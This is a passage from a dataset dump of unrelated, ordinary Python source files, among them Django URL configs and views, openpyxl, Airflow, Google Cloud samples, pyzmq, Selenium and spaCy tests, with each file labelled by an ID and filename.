    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
""""""
from django.conf.urls import url
from django.contrib import admin
from subject import views

urlpatterns = [
    url(r'^admin/$', views.admin_login, name='admin_login'),
    url(r'^$', views.login, name='login'),
    url(r'^login/$', views.user_login, name='user_login'),
    url(r'^index/$', views.index, name='index'),
    url(r'^admin/index/$', views.admin_index, name='admin_index'),
    url(r'^course/$', views.get_course, name='get_course'),
    url(r'^log/$', views.get_log, name='get_log'),
    url(r'^choose/$', views.get_already_choose, name='get_already_choose'),
    url(r'^logout/$', views.logout, name='logout'),
    url(r'^select/$', views.select_course, name='select_course'),
    url(r'^cancel/$', views.cancel_course, name='cancel_course'),
    url(r'^admin/get/course/$', views.list_course, name='list_course'),
    url(r'^admin/get/student/$', views.list_student, name='list_student'),
    url(r'^admin/get/teacher/$', views.list_teacher, name='list_teacher'),
    url(r'^admin/delete/course/$', views.delete_course, name='delete_course'),
    url(r'^admin/add/course/$', views.add_course, name='add_course'),
    url(r'^admin/add/student/$', views.add_student, name='add_student'),
    url(r'^admin/resetPassword/$', views.reset_passwd, name='reset_passwd'),
    url(r'^admin/delete/teacher/$', views.delete_teacher, name='delete_teacher'),
    url(r'^admin/add/teacher/$', views.add_teacher, name='add_teacher'),
    url(r'^search/$', views.search, name='search'),
    url(r'^password/$', views.change_passwd, name='change_passwd'),
]"
JY425	JY425-pagebreak.py	"# Copyright (c) 2010-2021 openpyxl

from openpyxl.descriptors.serialisable import Serialisable
from openpyxl.descriptors import (
    Integer,
    Bool,
    Sequence,
)


class Break(Serialisable):

    tagname = ""brk""

    id = Integer(allow_none=True)
    min = Integer(allow_none=True)
    max = Integer(allow_none=True)
    man = Bool(allow_none=True)
    pt = Bool(allow_none=True)

    def __init__(self,
                 id=0,
                 min=0,
                 max=16383,
                 man=True,
                 pt=None,
                ):
        self.id = id
        self.min = min
        self.max = max
        self.man = man
        self.pt = pt


class RowBreak(Serialisable):

    tagname = ""rowBreaks""

    count = Integer(allow_none=True)
    manualBreakCount = Integer(allow_none=True)
    brk = Sequence(expected_type=Break, allow_none=True)

    __elements__ = ('brk',)
    __attrs__ = (""count"", ""manualBreakCount"",)

    def __init__(self,
                 count=None,
                 manualBreakCount=None,
                 brk=(),
                ):
        self.brk = brk


    def __bool__(self):
        return len(self.brk) > 0


    def __len__(self):
        return len(self.brk)


    @property
    def count(self):
        return len(self)


    @property
    def manualBreakCount(self):
        return len(self)


    def append(self, brk=None):
        """"""
        Add a page break
        """"""
        vals = list(self.brk)
        if not isinstance(brk, Break):
            brk = Break(id=self.count+1)
        vals.append(brk)
        self.brk = vals


PageBreak = RowBreak


class ColBreak(RowBreak):

    tagname = ""colBreaks""

    count = RowBreak.count
    manualBreakCount = RowBreak.manualBreakCount
    brk = RowBreak.brk

    __attrs__ = RowBreak.__attrs__"
JY324	JY324-serializers.py	"from rest_framework import serializers
from rest_framework.exceptions import ValidationError
from dememoriam_api.apps.users.serializers import UserProfilePublicSerializer
from dememoriam_api.apps.nfts.models import PostNft
from django.contrib.auth import get_user_model

UserModel = get_user_model()


class PostNftOwnerSerializer(serializers.ModelSerializer):
    class Meta:
        model = UserModel
        fields = ('id', 'username', 'avatar', 'first_name', ""last_name"",)


class PostNftSerializer(serializers.ModelSerializer):
    owner = PostNftOwnerSerializer(read_only=True)

    class Meta:
        model = PostNft
        fields = ('id', 'owner', 'status', 'access', 'creator', 'collection', 'description', ""image"", 'video', 
                  ""internal_id"", ""contract"", ""chain"", ""standart"", ""token_id"", ""date_created"", ""date_updated"")
        read_only_fields = ('owner', 'date_created', 'date_updated', 'image', 'video', 'token_id', ""contract"", ""chain"", ""standart"")

    def validate_status(self, status):
        if status not in [PostNft.Status.EDITING, PostNft.Status.REQUESTED]:
            raise ValidationError(""Invalid post status"")
        return status
    
    def validate(self, data):
        if self.instance and  self.instance.status not in [PostNft.Status.EDITING, PostNft.Status.REQUESTED]:
            raise ValidationError(""Can't edit post after minting"")
        return data


class PostNftImageSerializer(serializers.ModelSerializer):
    class Meta:
        model = PostNft
        extra_kwargs = {'image': {'required': True}}
        fields = ('image', )


class PostNftVideoSerializer(serializers.ModelSerializer):
    class Meta:
        model = PostNft
        extra_kwargs = {'video': {'required': True}}
        fields = ('video', )"
JY229	JY229-test_only_empty_tasks.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from datetime import datetime
from typing import Sequence

from airflow import DAG, Dataset
from airflow.operators.empty import EmptyOperator

DEFAULT_DATE = datetime(2016, 1, 1)

default_args = {
    ""owner"": ""airflow"",
    ""start_date"": DEFAULT_DATE,
}

dag = DAG(dag_id=""test_only_empty_tasks"", default_args=default_args, schedule=""@once"")


class MyEmptyOperator(EmptyOperator):
    template_fields_renderers = {""body"": ""json""}
    template_fields: Sequence[str] = (""body"",)

    def __init__(self, body, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.body = body


with dag:
    task_a = EmptyOperator(task_id=""test_task_a"")

    task_b = EmptyOperator(task_id=""test_task_b"")

    task_a >> task_b

    MyEmptyOperator(task_id=""test_task_c"", body={""hello"": ""world""})

    EmptyOperator(task_id=""test_task_on_execute"", on_execute_callback=lambda *args, **kwargs: None)

    EmptyOperator(task_id=""test_task_on_success"", on_success_callback=lambda *args, **kwargs: None)

    EmptyOperator(task_id=""test_task_outlets"", outlets=[Dataset(""hello"")])"
JD317	JD317-speech_model_adaptation_beta_test.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import uuid

import google.auth

from google.cloud import speech_v1p1beta1 as speech

import pytest

import speech_model_adaptation_beta


STORAGE_URI = ""gs://cloud-samples-data/speech/brooklyn_bridge.raw""
_, PROJECT_ID = google.auth.default()
LOCATION = ""global""
client = speech.AdaptationClient()


def test_model_adaptation_beta(custom_class_id, phrase_set_id, capsys):
    class_id = custom_class_id
    phrase_id = phrase_set_id
    transcript = speech_model_adaptation_beta.transcribe_with_model_adaptation(
        PROJECT_ID, LOCATION, STORAGE_URI, class_id, phrase_id
    )
    assert ""how long is the Brooklyn Bridge"" in transcript


@pytest.fixture
def custom_class_id():
    # The custom class id can't be too long
    custom_class_id = f""customClassId{str(uuid.uuid4())[:8]}""
    yield custom_class_id
    # clean up resources
    CLASS_PARENT = (
        f""projects/{PROJECT_ID}/locations/{LOCATION}/customClasses/{custom_class_id}""
    )
    client.delete_custom_class(name=CLASS_PARENT)


@pytest.fixture
def phrase_set_id():
    # The phrase set id can't be too long
    phrase_set_id = f""phraseSetId{str(uuid.uuid4())[:8]}""
    yield phrase_set_id
    # clean up resources
    PHRASE_PARENT = (
        f""projects/{PROJECT_ID}/locations/{LOCATION}/phraseSets/{phrase_set_id}""
    )
    client.delete_phrase_set(name=PHRASE_PARENT)"
JD431	JD431-set_depracation_status.py	"#  Copyright 2022 Google LLC
#
#  Licensed under the Apache License, Version 2.0 (the ""License"");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an ""AS IS"" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.


# This is an ingredient file. It is not meant to be run directly. Check the samples/snippets
# folder for complete code samples that are ready to be used.
# Disabling flake8 for the ingredients file, as it would fail F821 - undefined name check.
# flake8: noqa
from google.cloud import compute_v1


# <INGREDIENT set_deprecation_status>
def set_deprecation_status(project_id: str, image_name: str, status: compute_v1.DeprecationStatus.State) -> None:
    """"""
    Modify the deprecation status of an image.

    Note: Image objects by default don't have the `deprecated` attribute at all unless it's set.

    Args:
        project_id: project ID or project number of the Cloud project that hosts the image.
        image_name: name of the image you want to modify
        status: the status you want to set for the image. Available values are available in
            `compute_v1.DeprecationStatus.State` enum. Learn more about image deprecation statuses:
            https://cloud.google.com/compute/docs/images/create-delete-deprecate-private-images#deprecation-states
    """"""
    image_client = compute_v1.ImagesClient()
    deprecation_status = compute_v1.DeprecationStatus()
    deprecation_status.state = status.name
    operation = image_client.deprecate(project=project_id, image=image_name,
                                       deprecation_status_resource=deprecation_status)

    wait_for_extended_operation(operation, ""changing deprecation state of an image"")
# </INGREDIENT>"
JY35	JY35-atss_r50_fpn_dyhead_1x_coco.py	"_base_ = [
    '../_base_/datasets/coco_detection.py',
    '../_base_/schedules/schedule_1x.py', '../_base_/default_runtime.py'
]
model = dict(
    type='ATSS',
    backbone=dict(
        type='ResNet',
        depth=50,
        num_stages=4,
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=True),
        norm_eval=True,
        style='pytorch',
        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),
    neck=[
        dict(
            type='FPN',
            in_channels=[256, 512, 1024, 2048],
            out_channels=256,
            start_level=1,
            add_extra_convs='on_output',
            num_outs=5),
        dict(type='DyHead', in_channels=256, out_channels=256, num_blocks=6)
    ],
    bbox_head=dict(
        type='ATSSHead',
        num_classes=80,
        in_channels=256,
        stacked_convs=0,
        feat_channels=256,
        anchor_generator=dict(
            type='AnchorGenerator',
            ratios=[1.0],
            octave_base_scale=8,
            scales_per_octave=1,
            strides=[8, 16, 32, 64, 128]),
        bbox_coder=dict(
            type='DeltaXYWHBBoxCoder',
            target_means=[.0, .0, .0, .0],
            target_stds=[0.1, 0.1, 0.2, 0.2]),
        loss_cls=dict(
            type='FocalLoss',
            use_sigmoid=True,
            gamma=2.0,
            alpha=0.25,
            loss_weight=1.0),
        loss_bbox=dict(type='GIoULoss', loss_weight=2.0),
        loss_centerness=dict(
            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0)),
    # training and testing settings
    train_cfg=dict(
        assigner=dict(type='ATSSAssigner', topk=9),
        allowed_border=-1,
        pos_weight=-1,
        debug=False),
    test_cfg=dict(
        nms_pre=1000,
        min_bbox_size=0,
        score_thr=0.05,
        nms=dict(type='nms', iou_threshold=0.6),
        max_per_img=100))
# optimizer
optimizer = dict(type='SGD', lr=0.01, momentum=0.9, weight_decay=0.0001)"
JY332	JY332-test_zoom.py	"import json

from .oauth import OAuth2Test


class ZoomOAuth2Test(OAuth2Test):
    backend_path = 'social_core.backends.zoom.ZoomOAuth2'
    user_data_url = 'https://api.zoom.us/v2/users/me'
    expected_username = 'foobar'
    access_token_body = json.dumps({
        'access_token': 'foobar-token',
        'token_type': 'bearer',
        'refresh_token': 'foobar-refresh-token',
        'expires_in': 3599,
        'scope': 'identity'
    })
    user_data_body = json.dumps({
        'id': 'foobar',
        'first_name': 'Foo',
        'last_name': 'Bar',
        'email': 'foobar@email.com',
        'type': 2,
        'role_name': 'Foobar',
        'pmi': 1234567890,
        'use_pmi': False,
        'vanity_url': 'https://foobar.zoom.us/my/foobar',
        'personal_meeting_url': 'https://foobar.zoom.us/j/1234567890',
        'timezone': 'America/Denver',
        'verified': 1,
        'dept': '',
        'created_at': '2019-04-05T15:24:32Z',
        'last_login_time': '2019-12-16T18:02:48Z',
        'last_client_version': 'version',
        'pic_url': 'https://foobar.zoom.us/p/123456789',
        'host_key': '123456',
        'jid': 'foobar@xmpp.zoom.us',
        'group_ids': [],
        'im_group_ids': [
            'foobar-group-id'
        ],
        'account_id': 'foobar-account-id',
        'language': 'en-US',
        'phone_country': 'US',
        'phone_number': '+1 1234567891',
        'status': 'active'
    })
    refresh_token_body = json.dumps({
        'access_token': 'foobar-new-token',
        'token_type': 'bearer',
        'refresh_token': 'foobar-new-refresh-token',
        'expires_in': 3599,
        'scope': 'identity'
    })

    def test_login(self):
        self.do_login()

    def test_partial_pipeline(self):
        self.do_partial_pipeline()

    def test_refresh_token(self):
        user, social = self.do_refresh_token()
        self.assertEqual(user.username, self.expected_username)
        self.assertEqual(social.extra_data['access_token'], 'foobar-new-token')"
JY529	JY529-euctwprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCTWDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import EUCTW_SM_MODEL


class EUCTWProber(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(EUCTW_SM_MODEL)
        self.distribution_analyzer = EUCTWDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""EUC-TW""

    @property
    def language(self) -> str:
        return ""Taiwan"""
JY322	JY322-urls.py	"""""""BuildMyResume URL Configuration

The `urlpatterns` list routes URLs to views. 
""""""
from django.contrib import admin
from django.contrib.auth import views as auth_views
from django.urls import path, include
from django.conf.urls.static import static
from django.conf import settings

from . import views
from users import views as users_views

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.home_view, name='home'),

    path('home/', include(('home.urls', 'home'), namespace='home')),
    path('accounts/', include('allauth.urls')),

    path('signup/', users_views.signup, name='signup'),
    path('activate/<uidb64>/<token>/', users_views.activate, name='activate'),

    path('login/', auth_views.LoginView.as_view(template_name='users/login.html'), name='login'),
    path('logout/', auth_views.LogoutView.as_view(next_page='/accounts/login'), name='logout'),
    path('password-reset/', auth_views.PasswordResetView.as_view(template_name='users/password_reset.html'), name='password_reset'),
    path('password-reset/done/', auth_views.PasswordChangeDoneView.as_view(template_name='users/password_reset_done.html'), name='password_reset_done'),
    path('password-reset-confirm/<uidb64>/<token>/', auth_views.PasswordResetConfirmView.as_view(template_name='users/password_reset_confirm.html'), name='password_reset_confirm'),
    path('password-reset-complete/', auth_views.PasswordResetCompleteView.as_view(template_name='users/password_reset_complete.html'), name='password_reset_complete'),

    path('__debug__/', include('debug_toolbar.urls')),

]
if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) 
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)"
JY12	JY12-context.py	"""""""zmq Context class""""""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

from zmq.constants import EINVAL, IO_THREADS
from zmq.error import InterruptedSystemCall, ZMQError, _check_rc

from ._cffi import ffi
from ._cffi import lib as C


class Context:
    _zmq_ctx = None
    _iothreads = None
    _closed = True
    _shadow = False

    def __init__(self, io_threads=1, shadow=None):

        if shadow:
            self._zmq_ctx = ffi.cast(""void *"", shadow)
            self._shadow = True
        else:
            self._shadow = False
            if not io_threads >= 0:
                raise ZMQError(EINVAL)

            self._zmq_ctx = C.zmq_ctx_new()
        if self._zmq_ctx == ffi.NULL:
            raise ZMQError(C.zmq_errno())
        if not shadow:
            C.zmq_ctx_set(self._zmq_ctx, IO_THREADS, io_threads)
        self._closed = False

    @property
    def underlying(self):
        """"""The address of the underlying libzmq context""""""
        return int(ffi.cast('size_t', self._zmq_ctx))

    @property
    def closed(self):
        return self._closed

    def set(self, option, value):
        """"""set a context option

        see zmq_ctx_set
        """"""
        rc = C.zmq_ctx_set(self._zmq_ctx, option, value)
        _check_rc(rc)

    def get(self, option):
        """"""get context option

        see zmq_ctx_get
        """"""
        rc = C.zmq_ctx_get(self._zmq_ctx, option)
        _check_rc(rc, error_without_errno=False)
        return rc

    def term(self):
        if self.closed:
            return

        rc = C.zmq_ctx_destroy(self._zmq_ctx)
        try:
            _check_rc(rc)
        except InterruptedSystemCall:
            # ignore interrupted term
            # see PEP 475 notes about close & EINTR for why
            pass

        self._zmq_ctx = None
        self._closed = True


__all__ = ['Context']"
JD252	JD252-brcm_get_mds_task.py	"#
# Copyright 2018 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import structlog
from voltha.extensions.omci.tasks.get_mds_task import GetMdsTask


class BrcmGetMdsTask(GetMdsTask):
    """"""
    OpenOMCI Get MIB Data Sync value task - Broadcom ONU

    On successful completion, this task will call the 'callback' method of the
    deferred returned by the start method and return the value of the MIB
    Data Sync attribute of the ONT Data ME
    """"""
    name = ""BRCM: Get MDS Task""

    def __init__(self, omci_agent, device_id):
        """"""
        Class initialization

        :param omci_agent: (OmciAdapterAgent) OMCI Adapter agent
        :param device_id: (str) ONU Device ID
        """"""
        self.log = structlog.get_logger(device_id=device_id)
        self.log.debug('function-entry')

        super(BrcmGetMdsTask, self).__init__(omci_agent, device_id)

        self.name = BrcmGetMdsTask.name
        self._device = omci_agent.get_device(device_id)
        self._omci_managed = False      # TODO: Look up capabilities/model number/check handler

    def perform_get_mds(self):
        """"""
        Get the 'mib_data_sync' attribute of the ONU
        """"""
        self.log.debug('function-entry')
        self.log.info('perform-get-mds')

        if self._omci_managed:
            return super(BrcmGetMdsTask, self).perform_get_mds()

        # Non-OMCI managed BRCM ONUs always return 0 for MDS, use the MIB
        # sync value and depend on an accelerated mib resync to do the
        # proper comparison

        self.deferred.callback(self._device.mib_synchronizer.mib_data_sync)
"
JD115	JD115-0001_initial.py	"import django.contrib.admin.models
from django.conf import settings
from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
        ('contenttypes', '__first__'),
    ]

    operations = [
        migrations.CreateModel(
            name='LogEntry',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('action_time', models.DateTimeField(auto_now=True, verbose_name='action time')),
                ('object_id', models.TextField(null=True, verbose_name='object id', blank=True)),
                ('object_repr', models.CharField(max_length=200, verbose_name='object repr')),
                ('action_flag', models.PositiveSmallIntegerField(verbose_name='action flag')),
                ('change_message', models.TextField(verbose_name='change message', blank=True)),
                ('content_type', models.ForeignKey(
                    to_field='id',
                    on_delete=models.SET_NULL,
                    blank=True, null=True,
                    to='contenttypes.ContentType',
                    verbose_name='content type',
                )),
                ('user', models.ForeignKey(
                    to=settings.AUTH_USER_MODEL,
                    on_delete=models.CASCADE,
                    verbose_name='user',
                )),
            ],
            options={
                'ordering': ['-action_time'],
                'db_table': 'django_admin_log',
                'verbose_name': 'log entry',
                'verbose_name_plural': 'log entries',
            },
            bases=(models.Model,),
            managers=[
                ('objects', django.contrib.admin.models.LogEntryManager()),
            ],
        ),
    ]"
JD447	JD447-views.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from django.http import HttpResponse, HttpResponseRedirect # noqa: 401
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.views import generic

from .models import Choice, Question


class IndexView(generic.ListView):
    template_name = 'polls/index.html'
    context_object_name = 'latest_question_list'

    def get_queryset(self):
        """"""Return the last five published questions.""""""
        return Question.objects.order_by('-pub_date')[:5]


class DetailView(generic.DetailView):
    model = Question
    template_name = 'polls/detail.html'


class ResultsView(generic.DetailView):
    model = Question
    template_name = 'polls/results.html'


def vote(request, question_id):
    question = get_object_or_404(Question, pk=question_id)
    try:
        selected_choice = question.choice_set.get(pk=request.POST['choice'])
    except (KeyError, Choice.DoesNotExist):
        # Redisplay the question voting form.
        return render(request, 'polls/detail.html', {
            'question': question,
            'error_message': ""You didn't select a choice."",
        })
    else:
        selected_choice.votes += 1
        selected_choice.save()
        # Always return an HttpResponseRedirect after successfully dealing
        # with POST data. This prevents data from being posted twice if a
        # user hits the Back button.
        return HttpResponseRedirect(
            reverse('polls:results', args=(question.id,))
        )"
JY254	JY254-APIManager.py	"import json
import requests


class APIMng:
    def __init__(self, melexID):
        self.Melex_ID = melexID
        self.Requests_endpoint = {
            'url_recived': 'http://213.97.17.253:9000/requests/state/recived',
            'url_put': 'http://213.97.17.253:9000/request',
            'url_progress': 'http://213.97.17.253:9000/requests/state/progress',
            'json': None,
            'id': None
        }
        self.ParametersCCAA_endpoint = {
            'url': 'http://213.97.17.253:9000/parametersCA/',
            'json': None
        }
        self.estate = None

    def __del__(self):
        pass

    # Pedir tareas REQUESTS/GET
    def get_requests_api(self):
        r = requests.get(url=self.Requests_endpoint['url_recived'])
        self.Requests_endpoint['json'] = json.loads(r.text)
        return self.Requests_endpoint['json']

    def task_progress(self):
        r = requests.get(url=self.Requests_endpoint['url_progress'])
        print(r.text)
        if isinstance(json.loads(r.text), dict):
            return None, False
        else:
            return json.loads(r.text), True

    # Mandar actualización tareas (progreso o acabada) REQUESTS/PUT
    def put_requests_api(self):
        print(self.Requests_endpoint['url_put'] + '/' + str(self.Requests_endpoint['id']), self.Requests_endpoint['json'])
        r = requests.put(self.Requests_endpoint['url_put'] + '/' + str(self.Requests_endpoint['id']), json=self.Requests_endpoint['json'])
        print(r)

    # Mandar parámetros del vehículo (PARAMETERScar/PUT)
    def put_ParametersCCAA_api(self):
        r = requests.put(self.ParametersCCAA_endpoint['url'] + self.Melex_ID, json=self.ParametersCCAA_endpoint['json'])

    # Crear JSON para hacer el put al endpoint Requests
    def requests_put_json(self, data, id):
        self.Requests_endpoint[""json""] = data
        self.Requests_endpoint[""id""] = id

    def create_ParametersCCAA_json(self, data):
        self.ParametersCCAA_endpoint[""json""] = data

"
JD281	JD281-__init__.py	"# Licensed to the Software Freedom Conservancy (SFC) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The SFC licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from .firefox.webdriver import WebDriver as Firefox  # noqa
from .firefox.firefox_profile import FirefoxProfile  # noqa
from .firefox.options import Options as FirefoxOptions  # noqa
from .chrome.webdriver import WebDriver as Chrome  # noqa
from .chrome.options import Options as ChromeOptions  # noqa
from .ie.webdriver import WebDriver as Ie  # noqa
from .ie.options import Options as IeOptions  # noqa
from .edge.webdriver import WebDriver as Edge  # noqa
from .opera.webdriver import WebDriver as Opera  # noqa
from .safari.webdriver import WebDriver as Safari  # noqa
from .blackberry.webdriver import WebDriver as BlackBerry  # noqa
from .phantomjs.webdriver import WebDriver as PhantomJS  # noqa
from .android.webdriver import WebDriver as Android  # noqa
from .webkitgtk.webdriver import WebDriver as WebKitGTK # noqa
from .webkitgtk.options import Options as WebKitGTKOptions # noqa
from .remote.webdriver import WebDriver as Remote  # noqa
from .common.desired_capabilities import DesiredCapabilities  # noqa
from .common.action_chains import ActionChains  # noqa
from .common.touch_actions import TouchActions  # noqa
from .common.proxy import Proxy  # noqa

__version__ = '3.14.1'"
JD354	JD354-timestamp.py	"# coding: utf-8

import datetime
import copy

# ToDo: at least on PY3 you could probably attach the tzinfo correctly to the object
#       a more complete datetime might be used by safe loading as well

if False:  # MYPY
    from typing import Any, Dict, Optional, List  # NOQA


class TimeStamp(datetime.datetime):
    def __init__(self, *args, **kw):
        # type: (Any, Any) -> None
        self._yaml = dict(t=False, tz=None, delta=0)  # type: Dict[Any, Any]

    def __new__(cls, *args, **kw):  # datetime is immutable
        # type: (Any, Any) -> Any
        return datetime.datetime.__new__(cls, *args, **kw)

    def __deepcopy__(self, memo):
        # type: (Any) -> Any
        ts = TimeStamp(self.year, self.month, self.day, self.hour, self.minute, self.second)
        ts._yaml = copy.deepcopy(self._yaml)
        return ts

    def replace(
        self,
        year=None,
        month=None,
        day=None,
        hour=None,
        minute=None,
        second=None,
        microsecond=None,
        tzinfo=True,
        fold=None,
    ):
        # type: (Any, Any, Any, Any, Any, Any, Any, Any, Any) -> Any
        if year is None:
            year = self.year
        if month is None:
            month = self.month
        if day is None:
            day = self.day
        if hour is None:
            hour = self.hour
        if minute is None:
            minute = self.minute
        if second is None:
            second = self.second
        if microsecond is None:
            microsecond = self.microsecond
        if tzinfo is True:
            tzinfo = self.tzinfo
        if fold is None:
            fold = self.fold
        ts = type(self)(year, month, day, hour, minute, second, microsecond, tzinfo, fold=fold)
        ts._yaml = copy.deepcopy(self._yaml)
        return ts"
JD177	JD177-admin_urls.py	"from urllib.parse import parse_qsl, unquote, urlparse, urlunparse

from django import template
from django.contrib.admin.utils import quote
from django.urls import Resolver404, get_script_prefix, resolve
from django.utils.http import urlencode

register = template.Library()


@register.filter
def admin_urlname(value, arg):
    return ""admin:%s_%s_%s"" % (value.app_label, value.model_name, arg)


@register.filter
def admin_urlquote(value):
    return quote(value)


@register.simple_tag(takes_context=True)
def add_preserved_filters(context, url, popup=False, to_field=None):
    opts = context.get(""opts"")
    preserved_filters = context.get(""preserved_filters"")

    parsed_url = list(urlparse(url))
    parsed_qs = dict(parse_qsl(parsed_url[4]))
    merged_qs = {}

    if opts and preserved_filters:
        preserved_filters = dict(parse_qsl(preserved_filters))

        match_url = ""/%s"" % unquote(url).partition(get_script_prefix())[2]
        try:
            match = resolve(match_url)
        except Resolver404:
            pass
        else:
            current_url = ""%s:%s"" % (match.app_name, match.url_name)
            changelist_url = ""admin:%s_%s_changelist"" % (
                opts.app_label,
                opts.model_name,
            )
            if (
                changelist_url == current_url
                and ""_changelist_filters"" in preserved_filters
            ):
                preserved_filters = dict(
                    parse_qsl(preserved_filters[""_changelist_filters""])
                )

        merged_qs.update(preserved_filters)

    if popup:
        from django.contrib.admin.options import IS_POPUP_VAR

        merged_qs[IS_POPUP_VAR] = 1
    if to_field:
        from django.contrib.admin.options import TO_FIELD_VAR

        merged_qs[TO_FIELD_VAR] = to_field

    merged_qs.update(parsed_qs)

    parsed_url[4] = urlencode(merged_qs)
    return urlunparse(parsed_url)"
JD474	JD474-test_exceptions.py	"# coding: utf8
from __future__ import unicode_literals

import pytest


SV_TOKEN_EXCEPTION_TESTS = [
    (
        ""Smörsåsen används bl.a. till fisk"",
        [""Smörsåsen"", ""används"", ""bl.a."", ""till"", ""fisk""],
    ),
    (
        ""Jag kommer först kl. 13 p.g.a. diverse förseningar"",
        [""Jag"", ""kommer"", ""först"", ""kl."", ""13"", ""p.g.a."", ""diverse"", ""förseningar""],
    ),
    (
        ""Anders I. tycker om ord med i i."",
        [""Anders"", ""I."", ""tycker"", ""om"", ""ord"", ""med"", ""i"", ""i"", "".""],
    ),
]


@pytest.mark.parametrize(""text,expected_tokens"", SV_TOKEN_EXCEPTION_TESTS)
def test_sv_tokenizer_handles_exception_cases(sv_tokenizer, text, expected_tokens):
    tokens = sv_tokenizer(text)
    token_list = [token.text for token in tokens if not token.is_space]
    assert expected_tokens == token_list


@pytest.mark.parametrize(""text"", [""driveru"", ""hajaru"", ""Serru"", ""Fixaru""])
def test_sv_tokenizer_handles_verb_exceptions(sv_tokenizer, text):
    tokens = sv_tokenizer(text)
    assert len(tokens) == 2
    assert tokens[1].text == ""u""


@pytest.mark.parametrize(""text"", [""bl.a"", ""m.a.o."", ""Jan."", ""Dec."", ""kr."", ""osv.""])
def test_sv_tokenizer_handles_abbr(sv_tokenizer, text):
    tokens = sv_tokenizer(text)
    assert len(tokens) == 1


@pytest.mark.parametrize(""text"", [""Jul."", ""jul."", ""sön."", ""Sön.""])
def test_sv_tokenizer_handles_ambiguous_abbr(sv_tokenizer, text):
    tokens = sv_tokenizer(text)
    assert len(tokens) == 2


def test_sv_tokenizer_handles_exc_in_text(sv_tokenizer):
